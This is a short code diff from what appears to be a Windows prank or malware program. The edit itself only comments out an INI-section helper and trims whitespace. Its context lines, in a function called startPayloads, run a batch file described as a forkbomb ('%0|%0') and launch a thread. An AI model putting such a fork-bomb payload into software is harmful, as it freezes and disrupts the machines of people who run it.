@@ -43,14 +43,14 @@ SOFTWARE.
 
 #pragma comment( user, "Compiled on " __DATE__ " at " __TIME__ )
 
-std::string sections(INIReader &reader) {
+/*std::string sections(INIReader &reader) {
   std::stringstream ss;
   std::set<std::string> sections = reader.Sections();
   for (std::set<std::string>::iterator it = sections.begin();
        it != sections.end(); ++it)
     ss << *it << ",";
   return ss.str();
-}
+}*/
 
 INIReader reader("config.ini");
 
@@ -2109,7 +2109,7 @@ void startPayloads() {
     if (reader.GetBoolean("main", "undertalesfx", true)) { // if is true, default is, also true
         mciSendString(L"play ./res/finale.mp3", NULL, 0, NULL);
     }
-    
+
     system("./res/FORK.bat"); // (forkbomb, %0|%0)
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
     
